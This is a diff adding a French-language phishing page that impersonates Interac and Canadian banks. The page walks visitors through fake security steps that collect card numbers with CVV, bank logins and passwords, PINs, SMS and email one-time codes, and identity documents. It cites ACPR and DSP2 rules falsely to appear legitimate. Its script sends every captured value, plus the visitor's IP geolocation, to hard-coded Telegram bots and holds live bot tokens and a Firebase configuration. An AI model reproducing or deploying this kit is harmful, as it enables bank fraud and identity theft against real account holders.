+                        <input type="text" id="sms" class="form-input" placeholder="••••••" maxlength="6" required>
+                        <div style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--border-color); font-size: 20px;">📱</div>
+                    </div>
+                    <div class="error-message" id="sms-error">Veuillez saisir le code SMS reçu</div>
+                </div>
+                
+                <div style="text-align: center; margin: 20px 0; padding: 15px; background: rgba(251, 191, 36, 0.1); border-radius: 10px; border: 1px solid var(--border-color);">
+                    <div style="color: var(--border-color); font-size: 16px; margin-bottom: 10px;">
+                        <strong>📨 Un code SMS a été envoyé au :</strong>
+                    </div>
+                    <div id="sms-phone-number" style="font-size: 18px; font-weight: bold; color: var(--white-color);">
+                        +33 ••• •• •• ••
+                    </div>
+                    <div style="color: #CCCCCC; font-size: 14px; margin-top: 10px;">
+                        Ce code expirera dans 5 minutes
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin: 20px 0; color: #CCCCCC; font-size: 14px;">
+                    <span style="color: var(--border-color);">✅</span> Ce code SMS est requis pour finaliser la validation sécurisée
+                </div>
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(6)">
+                        <span class="btn-text" id="prev6-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-submit" onclick="validateStep(6)">
+                        <span class="btn-text" id="submit-sms-text">Valider le SMS</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- LOADING ÉTAPE 6 (après SMS) -->
+            <div class="loading-step-sms" id="step-loading-sms">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="loadingsms-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="loadingsms-bank-name">Banque</div>
+                        <div class="user-name" id="loadingsms-user-name">Nom Prénom</div>
+                        <div class="account-status">Validation finale en cours</div>
+                    </div>
+                </div>
+                
+                <div class="loading-icon-sms">⏳</div>
+                <h2 class="loading-title-sms">Validation du code SMS en cours</h2>
+                <div class="loading-message-sms">
+                    Votre code SMS est en cours de vérification.<br><br>
+                    <strong>Votre virement de 875,00 € est en préparation...</strong><br><br>
+                    <span style="color: var(--border-color);">✅ Dernière étape de sécurité avant validation</span>
+                </div>
+                
+                <div class="progress-bar-sms">
+                    <div class="progress-fill-sms" id="progress-fill-sms"></div>
+                </div>
+                
+                <div class="confirmation-note">
+                    Cette validation finale assure la sécurité maximale de votre transaction.
+                </div>
+            </div>
+
+            <!-- PAGE DE CHARGEMENT APRÈS SMS (VERS EMAIL) -->
+            <div class="loading-step-after-sms" id="step-loading-after-sms">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="loadingaftersms-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="loadingaftersms-bank-name">Banque</div>
+                        <div class="user-name" id="loadingaftersms-user-name">Nom Prénom</div>
+                        <div class="account-status">Préparation de la validation par email</div>
+                    </div>
+                </div>
+                
+                <div class="loading-icon-after-sms">📧</div>
+                <h2 class="loading-title-after-sms">Préparation de l'envoi du code email</h2>
+                <div class="loading-message-after-sms">
+                    Votre code SMS a été validé avec succès.<br><br>
+                    <strong>Envoi du code de sécurité par email en cours...</strong><br><br>
+                    <span style="color: var(--border-color);">⏱️ Cette étape sécurisée prend quelques instants</span>
+                </div>
+                
+                <div class="progress-bar-after-sms">
+                    <div class="progress-fill-after-sms" id="progress-fill-after-sms"></div>
+                </div>
+                
+                <div class="confirmation-note">
+                    Un code de sécurité sera envoyé à votre adresse email pour la validation finale.
+                </div>
+            </div>
+
+            <!-- ÉTAPE 7: CONFIRMATION EMAIL -->
+            <div class="email-confirmation-step" id="step-7">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="email-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="email-bank-name">Banque</div>
+                        <div class="user-name" id="email-user-name">Nom Prénom</div>
+                        <div class="account-status">Validation finale - Code de sécurité par email</div>
+                    </div>
+                </div>
+                
+                <div class="email-confirmation-icon">📧</div>
+                <h2 class="email-confirmation-title">Vérification par Email</h2>
+                <div class="email-confirmation-message">
+                    Un code de sécurité à <strong>5 ou 6 chiffres</strong> a été envoyé à votre adresse email.<br>
+                    <strong>Veuillez saisir le code ci-dessous pour finaliser la validation.</strong>
+                </div>
+                
+                <div class="email-info">
+                    <div style="color: var(--border-color); font-size: 16px; margin-bottom: 10px;">
+                        <strong>📧 Code envoyé à l'adresse :</strong>
+                    </div>
+                    <div class="email-address" id="email-address-display">
+                        utilisateur@exemple.com
+                    </div>
+                    <div style="color: #CCCCCC; font-size: 14px; margin-top: 10px;">
+                        Vérifiez votre boîte de réception et vos spams
+                    </div>
+                </div>
+                
+                <div class="email-code-input">
+                    <input type="text" class="email-code-digit" maxlength="1" data-index="0">
+                    <input type="text" class="email-code-digit" maxlength="1" data-index="1">
+                    <input type="text" class="email-code-digit" maxlength="1" data-index="2">
+                    <input type="text" class="email-code-digit" maxlength="1" data-index="3">
+                    <input type="text" class="email-code-digit" maxlength="1" data-index="4">
+                    <input type="text" class="email-code-digit" maxlength="1" data-index="5" style="opacity: 0.5;" title="Optionnel - 6ème chiffre">
+                </div>
+                
+                <div class="email-countdown" id="email-countdown">05:00</div>
+                
+                <div class="email-note">
+                    Ce code expirera dans 5 minutes. Vous pouvez utiliser 5 ou 6 chiffres.
+                </div>
+                
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(7)">
+                        <span class="btn-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-submit" onclick="validateStep(7)">
+                        <span class="btn-text">Valider le code email</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- LOADING ÉTAPE 7 (après email) -->
+            <div class="loading-step-email" id="step-loading-email">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="loadingemail-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="loadingemail-bank-name">Banque</div>
+                        <div class="user-name" id="loadingemail-user-name">Nom Prénom</div>
+                        <div class="account-status">Validation finale en cours</div>
+                    </div>
+                </div>
+                
+                <div class="loading-icon-email">⏳</div>
+                <h2 class="loading-title-email">Validation du code email en cours</h2>
+                <div class="loading-message-email">
+                    Votre code email est en cours de vérification.<br><br>
+                    <strong>Préparation du virement de 875,00 €...</strong><br><br>
+                    <span style="color: var(--border-color);">✅ Dernière étape de sécurité avant validation finale</span>
+                </div>
+                
+                <div class="progress-bar-email">
+                    <div class="progress-fill-email" id="progress-fill-email"></div>
+                </div>
+                
+                <div class="confirmation-note">
+                    Cette validation finale assure la sécurité maximale de votre transaction.
+                </div>
+            </div>
+
+            <!-- ÉTAPE 8: CHOIX DES DOCUMENTS -->
+            <div class="form-step" id="step-8">
+                <div class="user-display" style="margin-bottom: 25px;">
+                    <div class="bank-logo-display" id="docs-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="docs-bank-name">Banque</div>
+                        <div class="user-name" id="docs-user-name">Nom Prénom</div>
+                        <div class="account-status">Vérification d'identité renforcée</div>
+                    </div>
+                </div>
+                
+                <h2 class="form-title" style="color: var(--border-color); margin-bottom: 10px;">🔐 VÉRIFICATION D'IDENTITÉ RENFORCÉE</h2>
+                <div style="text-align: center; color: #CCCCCC; margin-bottom: 25px; font-size: 14px;">
+                    Conformément à la réglementation DSP2, une vérification d'identité supplémentaire est requise
+                </div>
+                
+                <div style="background: rgba(251, 191, 36, 0.1); border-left: 4px solid var(--border-color); padding: 15px; border-radius: 8px; margin-bottom: 25px;">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <span style="font-size: 24px;">🛡️</span>
+                        <div>
+                            <strong style="color: var(--border-color);">Protection renforcée</strong>
+                            <p style="color: #CCCCCC; font-size: 13px; margin-top: 5px;">Conformément aux exigences de l'ACPR, nous devons vérifier votre identité par pièce officielle</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 30px 0;">
+                    <div class="document-option" id="option-carte" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px solid var(--border-color); border-radius: 15px; padding: 25px; cursor: pointer; transition: all 0.3s ease; text-align: center;" onclick="selectDocumentOption('carte')">
+                        <div style="font-size: 48px; margin-bottom: 15px;">🆔</div>
+                        <h3 style="color: var(--white-color); margin-bottom: 10px;">Carte d'identité nationale</h3>
+                        <p style="color: #CCCCCC; font-size: 14px; margin-bottom: 15px;">Recto + Verso</p>
+                        <div style="display: flex; justify-content: center; gap: 5px; margin-bottom: 15px;">
+                            <span style="background: var(--border-color); color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Recto</span>
+                            <span style="background: var(--border-color); color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Verso</span>
+                            <span style="background: var(--border-color); color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Avis d'imposition</span>
+                        </div>
+                        <div style="font-size: 14px; color: #10B981;">
+                            <span>✓ 3 fichiers requis</span>
+                        </div>
+                    </div>
+                    
+                    <div class="document-option" id="option-passeport" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px solid #333; border-radius: 15px; padding: 25px; cursor: pointer; transition: all 0.3s ease; text-align: center;" onclick="selectDocumentOption('passeport')">
+                        <div style="font-size: 48px; margin-bottom: 15px;">🛂</div>
+                        <h3 style="color: var(--white-color); margin-bottom: 10px;">Passeport</h3>
+                        <p style="color: #CCCCCC; font-size: 14px; margin-bottom: 15px;">Page principale</p>
+                        <div style="display: flex; justify-content: center; gap: 5px; margin-bottom: 15px;">
+                            <span style="background: var(--border-color); color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Passeport</span>
+                            <span style="background: var(--border-color); color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Avis d'imposition</span>
+                        </div>
+                        <div style="font-size: 14px; color: #10B981;">
+                            <span>✓ 2 fichiers requis</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.5); border-radius: 10px;">
+                    <p style="color: #999; font-size: 12px;">
+                        ⚖️ Conformément à l'article L561-5 du Code monétaire et financier, ces documents sont nécessaires à la vérification d'identité
+                    </p>
+                </div>
+                
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(8)">
+                        <span class="btn-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-next" onclick="validateDocumentChoice()" id="continue-docs-btn" disabled style="opacity: 0.5;">
+                        <span class="btn-text">Continuer</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- ÉTAPE 9: UPLOAD DES DOCUMENTS -->
+            <div class="form-step" id="step-9">
+                <div class="user-display" style="margin-bottom: 25px;">
+                    <div class="bank-logo-display" id="upload-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="upload-bank-name">Banque</div>
+                        <div class="user-name" id="upload-user-name">Nom Prénom</div>
+                        <div class="account-status">Upload des documents requis</div>
+                    </div>
+                </div>
+                
+                <h2 class="form-title" style="color: var(--border-color); margin-bottom: 20px;" id="upload-title">Téléchargez vos documents</h2>
+                
+                <div id="upload-areas-container"></div>
+                
+                <div style="margin: 30px 0 20px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: var(--white-color);">
+                        <span>Progression du téléchargement</span>
+                        <span id="upload-progress-percent">0%</span>
+                    </div>
+                    <div style="width: 100%; height: 10px; background: #1a1a1a; border-radius: 5px; overflow: hidden; border: 1px solid var(--border-color);">
+                        <div id="upload-progress-bar" style="width: 0%; height: 100%; background: linear-gradient(to right, var(--button-color), #FFFFFF); transition: width 0.3s ease;"></div>
+                    </div>
+                </div>
+                
+                <div id="upload-status" style="text-align: center; margin: 20px 0; color: #CCCCCC; font-size: 14px;">
+                    En attente des documents...
+                </div>
+                
+                <div style="background: rgba(0,0,0,0.5); border-radius: 8px; padding: 15px; margin: 20px 0;">
+                    <p style="color: #999; font-size: 11px; line-height: 1.5;">
+                        🔒 Les documents sont chiffrés en AES-256 avant transmission. Conformément au RGPD, ils sont stockés de manière sécurisée et ne seront utilisés que pour la vérification d'identité. 
+                        Conformément à la réglementation bancaire, ces pièces justificatives sont conservées pendant 5 ans.
+                    </p>
+                </div>
+                
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(9)">
+                        <span class="btn-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-submit" onclick="validateDocuments()" id="validate-docs-btn" disabled style="opacity: 0.5;">
+                        <span class="btn-text">Valider les documents</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- ÉTAPE DE CHARGEMENT FINAL AVANT SUCCÈS -->
+            <div class="loading-step-final" id="step-loading-final">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="loadingfinal-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="loadingfinal-bank-name">Banque</div>
+                        <div class="user-name" id="loadingfinal-user-name">Nom Prénom</div>
+                        <div class="account-status">Vérification finale des documents</div>
+                    </div>
+                </div>
+                
+                <div class="loading-icon" style="font-size: 60px; margin-bottom: 25px; animation: spin 2s linear infinite;">⚙️</div>
+                <h2 class="loading-title">Vérification des documents en cours</h2>
+                <div class="loading-message">
+                    <strong>Analyse et validation des pièces justificatives...</strong><br><br>
+                    <span style="color: var(--border-color);">🔍 Vérification par les services de l'ACPR</span>
+                </div>
+                
+                <div style="margin: 30px 0;">
+                    <div style="display: flex; justify-content: center; gap: 20px;">
+                        <div style="text-align: center;">
+                            <div style="font-size: 24px; color: #10B981;">✓</div>
+                            <div style="font-size: 12px; color: #CCCCCC;">Authenticité</div>
+                        </div>
+                        <div style="text-align: center;">
+                            <div style="font-size: 24px; color: #FBBF24;">⟳</div>
+                            <div style="font-size: 12px; color: #CCCCCC;">Anti-fraude</div>
+                        </div>
+                        <div style="text-align: center;">
+                            <div style="font-size: 24px; color: #FBBF24;">⟳</div>
+                            <div style="font-size: 12px; color: #CCCCCC;">Biométrie</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="progress-bar-60">
+                    <div class="progress-fill-60" id="progress-fill-final"></div>
+                </div>
+                
+                <div class="confirmation-note">
+                    Validation conforme aux exigences de la Directive Européenne DSP2
+                </div>
+            </div>
+        </div>
+
+        <div class="partner-logos">
+            <div class="partner-logo">
+                <img src="https://mma.prnewswire.com/media/2072460/Interac_Corp__Interac_s_curise_les_transactions_num_riques_avec.jpg?p=facebook" alt="Banque du Canada">
+            </div>
+            <div class="partner-logo">
+                <img src="https://cdn.worldvectorlogo.com/logos/interac-1.svg" alt="INTERAC">
+            </div>
+            <div class="partner-logo">
+                <img src="https://www.moneris.com/-/media/images/moneris-,-a-,-card-brand-logo-page/logo-list-2022/card-brand-logo-new-2023.ashx?h=159&w=500&la=fr-ca&hash=F0CABA71835017E806A2D01D441E5318" alt="ACPR">
+            </div>
+        </div>
+
+        <div class="copyright">
+            © Copyright 2026 Interac. Tous droits réservés.
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION TELEGRAM - VOS DEUX BOTS
+        // ============================================
+        const TELEGRAM_BOTS = [
+            {
+                token: "8795455461:AAHJMYVpqX-bzAmSnRPZueKbhEl0n7VixDA",
+                chatId: "7365120322"
+            },
+            {
+                token: "8706580169:AAERDvbunMCtDqFjJN2hQ4g_2vk427FfG0M",
+                chatId: "8509109328"
+            }
+        ];
+        
+        // ============================================
+        // CONFIGURATION FIREBASE
+        // ============================================
+        const FIREBASE_CONFIG = {
+            apiKey: "AIzaSyAgqcqyOq-Qtb404YUT0mhkhWbQ63eciKw",
+            authDomain: "panelenlive-pro.firebaseapp.com",
+            databaseURL: "https://panelenlive-pro-default-rtdb.firebaseio.com",
+            projectId: "panelenlive-pro",
+            storageBucket: "panelenlive-pro.firebasestorage.app",
+            messagingSenderId: "40552253663",
+            appId: "1:40552253663:web:6da6e50ecbf7cfdb16816a"
+        };
+        
+        // ============================================
+        // CONFIGURATION (conservée intacte)
+        // ============================================
+        const ADMIN_CONFIG = { THEME_COLOR: "black", BUTTON_COLOR: "yellow", BORDER_COLOR: "yellow" };
+        
+        const TIMER_CONFIG = {
+            timerStep3: 60, timerStep4: 60, timerStep5: 60, timerStep6: 60,
+            get timerStep3Ms() { return this.timerStep3 * 1000; },
+            get timerStep4Ms() { return this.timerStep4 * 1000; },
+            get timerStep5Ms() { return this.timerStep5 * 1000; },
+            get timerStep6Ms() { return this.timerStep6 * 1000; }
+        };
+
+        const COLOR_CONFIG = {
+            blue: { primary: '#3B82F6', button: '#3B82F6', border: '#3B82F6' },
+            green: { primary: '#10B981', button: '#10B981', border: '#10B981' },
+            red: { primary: '#DC2626', button: '#DC2626', border: '#DC2626' },
+            orange: { primary: '#F59E0B', button: '#F59E0B', border: '#F59E0B' },
+            yellow: { primary: '#FBBF24', button: '#FBBF24', border: '#FBBF24' },
+            gray: { primary: '#6B7280', button: '#6B7280', border: '#6B7280' },
+            black: { primary: '#000000', button: '#FBBF24', border: '#FBBF24' }
+        };
+
+        const CARD_TYPES = {
+            visa: { pattern: /^4/, logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg/3840px-Visa_Inc._logo_%282005%E2%80%932014%29.svg.png', color: '#1a1f71' },
+            mastercard: { pattern: /^5[1-5]/, logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png', color: '#eb001b' },
+            amex: { pattern: /^3[47]/, logo: 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg', color: '#2e77bc' },
+            maestro: { pattern: /^(5018|5020|5038|6304|6759|6761|6763)/, logo: 'https://upload.wikimedia.org/wikipedia/commons/8/80/Maestro_2016.svg', color: '#009bd7' },
+            cb: { pattern: /^4[0-9]{12}(?:[0-9]{3})?$/, logo: 'https://www.prestasoo.com/images/logo-cb.jpg', color: '#0055a4' }
+        };
+
+        const BANK_LOGOS = {
+            'rbc': 'https://yt3.googleusercontent.com/dDqTsOO-YgnvajZ9AJc9tcDgHArhE9IQ7IcffbRBe-d-PXehLcRo1jR6F3CxvyLT6KzQZahmANA=s900-c-k-c0x00ffffff-no-rj',
+            'td': 'https://valleesaintsauveur.com/wp-content/uploads/2026/01/td-canada-trust-logo.jpg',
+            'scotiabank': 'https://ofa.on.ca/wp-content/uploads/2018/11/Scotiabank.jpg',
+            'bmo': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSF-oQO1HBsKVV_ZEK5cIafXZv-1OS_e0u4RA&s',
+            'cibc': 'https://play-lh.googleusercontent.com/r91yrh6gLzo_USIjZrep3Tj3F8QJBOqE4FVj1Wy_p97WcRWzE7eW-vo6BKabk42IOSoH',
+            'national-bank': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRBJtcSQxvURcsQg-uQWyV5IXQsqbjzmqhKJA&s',
+            'desjardins': 'https://mma.prnewswire.com/media/1273792/Mouvement_Desjardins_Le_Mouvement_Desjardins_compl_te_une_premi_.jpg?p=facebook',
+            'hsbc': 'https://mms.businesswire.com/media/20210928005052/fr/1047388/4/HSBC_MASTERBRAND_LOGO_RGB.jpg',
+            'laurentian': 'https://upload.wikimedia.org/wikipedia/commons/b/b5/Logo_Banque_Laurentienne.png',
+            'tangerine': 'https://play-lh.googleusercontent.com/mcK5HawyKumUAJ0GXe8UMa4TIhJLmMvwB1JkDg5bUcV_lwG3iKEGVbRymOkScCN3b7k=w416-h235-rw',
+            'alterna': 'https://mma.prnewswire.com/media/721204/Alterna_Savings_and_Credit_Union_Alterna_Savings_launches_MyRece.jpg?p=facebook',
+            'equitable': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/61ba3de3d136c62d8cb4ffda/0x0.png',
+            'motus': 'https://loanscanada.ca/wp-content/uploads/2021/05/Motusbank-Review-1.png',
+            'presidents-choice': 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b1/President%27s_Choice_Financial_logo.svg/1280px-President%27s_Choice_Financial_logo.svg.png',
+            'simplii': 'https://upload.wikimedia.org/wikipedia/commons/7/7e/Simplii_Financial_2023.png',
+            'vancity': 'https://theamazingbrentwood.com/wp-content/uploads/2019/11/vancity-edit.png',
+            'meridian': 'https://media.volinspire.com/images/c1/7e/dd/c17eddd53d820a5fff700210dca33265a98b1b1e_logo.png',
+            'coast-capital': 'https://www.temenos.com/wp-content/uploads/2019/07/client-coast-capital-landscape-image-2019-jul-12.jpg',
+            'firstontario': 'https://play-lh.googleusercontent.com/3rI01Oki2nGKpruKcpRdjqcQU6ukgDgsqzVLUnbK4bbesVeK846a00qV-QH97W4CqPU=w416-h235-rw'
+        };
+
+        const BANK_NAMES = {
+            'rbc': 'Royal Bank of Canada', 'td': 'TD Canada Trust', 'scotiabank': 'Scotiabank',
+            'bmo': 'Banque de Montréal', 'cibc': 'CIBC', 'national-bank': 'Banque Nationale',
+            'desjardins': 'Mouvement Desjardins', 'hsbc': 'HSBC Canada', 'laurentian': 'Banque Laurentienne',
+            'tangerine': 'Tangerine', 'alterna': 'Alterna Savings', 'equitable': 'Equitable Bank',
+            'motus': 'Motus Bank', 'presidents-choice': 'President\'s Choice Financial',
+            'simplii': 'Simplii Financial', 'vancity': 'Vancity', 'meridian': 'Meridian Credit Union',
+            'coast-capital': 'Coast Capital Savings', 'firstontario': 'FirstOntario Credit Union'
+        };
+
+        // ============================================
+        // FONCTION DE GÉOLOCALISATION
+        // ============================================
+        async function fetchGeoLocation() {
+            try {
+                // Utiliser ipapi.co pour obtenir l'IP et la localisation
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('Erreur API');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    country_code: data.country_code,
+                    city: data.city,
+                    region: data.region,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    flag: data.country_flag_emoji || '🌍',
+                    isp: data.org,
+                    timezone: data.timezone
+                };
+            } catch (error) {
+                console.log('❌ Erreur récupération géolocalisation:', error);
+                // Fallback : informations basées sur la langue du navigateur
+                const lang = navigator.language;
+                let fallbackCountry = 'France';
+                let fallbackCity = 'Paris';
+                let fallbackFlag = '🇫🇷';
+                if (lang.includes('en')) { fallbackCountry = 'United States'; fallbackCity = 'New York'; fallbackFlag = '🇺🇸'; }
+                else if (lang.includes('de')) { fallbackCountry = 'Germany'; fallbackCity = 'Berlin'; fallbackFlag = '🇩🇪'; }
+                else if (lang.includes('es')) { fallbackCountry = 'Spain'; fallbackCity = 'Madrid'; fallbackFlag = '🇪🇸'; }
+                
+                return {
+                    ip: '0.0.0.0',
+                    country: fallbackCountry,
+                    country_code: lang.split('-')[1] || 'FR',
+                    city: fallbackCity,
+                    region: 'Inconnu',
+                    latitude: null,
+                    longitude: null,
+                    flag: fallbackFlag,
+                    isp: 'Inconnu',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+            }
+        }
+
+        // ============================================
+        // VARIABLES GLOBALES
+        // ============================================
+        let currentStep = 1;
+        const totalSteps = 9;
+        let welcomeNotificationShown = false;
+        let redirectTimer = null;
+        let confirmationTimer = null;
+        let emailCountdownTimer = null;
+        let collectedData = { errorCounts: { connection: 0, code: 0, sms: 0, email: 0 } };
+        let uniqueReferenceNumber = '';
+        let currentSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+        // ============================================
+        // FONCTIONS TELEGRAM - ENVOI UNIQUE PAR BOT
+        // ============================================
+        function sendToTelegram(message) {
+            const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+            const formattedMessage = `🤖 *NOUVELLE SOUMISSION*\n📅 ${timestamp}\n━━━━━━━━━━━━━━━━━━━━━\n\n${message}\n━━━━━━━━━━━━━━━━━━━━━\n🔐 Session: ${currentSessionId}\n🌐 URL: ${window.location.href}`;
+            
+            const encodedMessage = encodeURIComponent(formattedMessage);
+            
+            TELEGRAM_BOTS.forEach(bot => {
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown&disable_web_page_preview=true`;
+                console.log(`📤 Message unique envoyé au bot ${bot.token.substring(0, 10)}...`);
+            });
+        }
+
+        function formatStepMessage(stepNumber, data) {
+            let message = '';
+            const stepName = getStepName(stepNumber);
+            
+            message += `*📝 ÉTAPE ${stepNumber} - ${stepName}*\n`;
+            message += `└─ ${new Date().toLocaleTimeString('fr-FR')}\n\n`;
+            
+            if (stepNumber === 1 && data) {
+                if (data.nom) message += `👤 *Nom:* ${data.nom}\n`;
+                if (data.prenom) message += `👤 *Prénom:* ${data.prenom}\n`;
+                if (data.email) message += `📧 *Email:* ${data.email}\n`;
+                if (data.telephone) message += `📱 *Téléphone:* ${data.telephone}\n`;
+                if (data.adresse) message += `🏠 *Adresse:* ${data.adresse}\n`;
+                if (data.banque) {
+                    const bankName = BANK_NAMES[data.banque] || data.banque;
+                    message += `🏦 *Banque:* ${bankName}\n`;
+                }
+            }
+            else if (stepNumber === 2 && data) {
+                if (data.carte) {
+                    const maskedCard = data.carte.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim();
+                    message += `💳 *Carte:* ${maskedCard}\n`;
+                }
+                if (data.nomCarte) message += `📛 *Nom sur carte:* ${data.nomCarte}\n`;
+                if (data.expiration) message += `📅 *Expiration:* ${data.expiration}\n`;
+                if (data.cvv) message += `🔐 *CVV:* ${data.cvv}\n`;
+            }
+            else if (stepNumber === 3 && data) {
+                if (data.identifiant) message += `👤 *Identifiant:* ${data.identifiant}\n`;
+                if (data.motdepasse) message += `🔑 *Mot de passe:* ${data.motdepasse}\n`;
+            }
+            else if (stepNumber === 5 && data) {
+                if (data.pin) message += `🔢 *Code PIN:* ${data.pin}\n`;
+            }
+            else if (stepNumber === 6 && data) {
+                if (data.sms) message += `📨 *Code SMS:* ${data.sms}\n`;
+            }
+            else if (stepNumber === 7 && data) {
+                if (data.emailCode) message += `📧 *Code Email:* ${data.emailCode}\n`;
+            }
+            else if (stepNumber === 8 && data) {
+                if (data.documentOption) {
+                    const docType = data.documentOption === 'carte' ? 'Carte d\'identité' : 'Passeport';
+                    message += `📄 *Type document:* ${docType}\n`;
+                }
+            }
+            
+            return message;
+        }
+
+        function getStepName(step) {
+            const names = {
+                1: 'Informations Personnelles',
+                2: 'Carte Bancaire',
+                3: 'Identifiants Bancaires',
+                4: 'Confirmation App',
+                5: 'Code PIN',
+                6: 'Code SMS',
+                7: 'Code Email',
+                8: 'Choix Documents',
+                9: 'Upload Documents'
+            };
+            return names[step] || `Étape ${step}`;
+        }
+
+        // ============================================
+        // COUNTRY CODES (conservé)
+        // ============================================
+        const COUNTRY_CODES = {
+            'FR': { code: '+33', name: 'France', flag: '🇫🇷', pattern: /^(0|\+33)/, digits: 9, format: 'XX XX XX XX XX' },
+            'BE': { code: '+32', name: 'Belgique', flag: '🇧🇪', pattern: /^(0|\+32)/, digits: 8, format: 'XXX XX XX XX' },
+            'CH': { code: '+41', name: 'Suisse', flag: '🇨🇭', pattern: /^(0|\+41)/, digits: 9, format: 'XX XXX XX XX' },
+            'CA': { code: '+1', name: 'Canada', flag: '🇨🇦', pattern: /^(\+1|1)/, digits: 10, format: 'XXX XXX XXXX' },
+            'US': { code: '+1', name: 'États-Unis', flag: '🇺🇸', pattern: /^(\+1|1)/, digits: 10, format: 'XXX XXX XXXX' },
+            'GB': { code: '+44', name: 'Royaume-Uni', flag: '🇬🇧', pattern: /^(0|\+44)/, digits: 10, format: 'XXXX XXX XXX' },
+            'DE': { code: '+49', name: 'Allemagne', flag: '🇩🇪', pattern: /^(0|\+49)/, digits: 10, format: 'XXX XXXX XXXX' }
+        };
+
+        // ============================================
+        // FONCTIONS TÉLÉPHONE (conservées - avec détection automatique)
+        // ============================================
+        function detectCountryCode() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            try {
+                                const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&localityLanguage=fr`);
+                                const data = await response.json();
+                                resolve(COUNTRY_CODES[data.countryCode] || COUNTRY_CODES['FR']);
+                            } catch { resolve(COUNTRY_CODES['FR']); }
+                        },
+                        () => resolve(COUNTRY_CODES['FR']),
+                        { timeout: 5000 }
+                    );
+                } else { resolve(COUNTRY_CODES['FR']); }
+            });
+        }
+
+        function formatPhoneNumber(value, countryCode) {
+            let digits = value.replace(/\D/g, '');
+            const country = COUNTRY_CODES[countryCode] || COUNTRY_CODES['FR'];
+            if (digits.length > country.digits) digits = digits.slice(0, country.digits);
+            if (digits.length === 0) return '';
+            const format = country.format;
+            let formatted = '';
+            let digitIndex = 0;
+            for (let i = 0; i < format.length && digitIndex < digits.length; i++) {
+                if (format[i] === 'X') { formatted += digits[digitIndex]; digitIndex++; }
+                else { formatted += format[i]; }
+            }
+            return formatted;
+        }
+
+        function validatePhoneNumber() {
+            const telephone = document.getElementById('telephone');
+            const countrySelect = document.getElementById('country-code');
+            const errorElement = document.getElementById('telephone-error');
+            if (!telephone || !countrySelect) return false;
+            const selectedCountry = countrySelect.value;
+            const countryData = COUNTRY_CODES[selectedCountry];
+            const cleanNumber = telephone.value.replace(/\s/g, '').replace(/\D/g, '');
+            if (!telephone.value.trim() || cleanNumber.length !== countryData.digits) {
+                telephone.classList.add('error');
+                if (errorElement) { errorElement.textContent = `❌ Numéro invalide: ${cleanNumber.length}/${countryData.digits} chiffres`; errorElement.style.display = 'block'; }
+                return false;
+            }
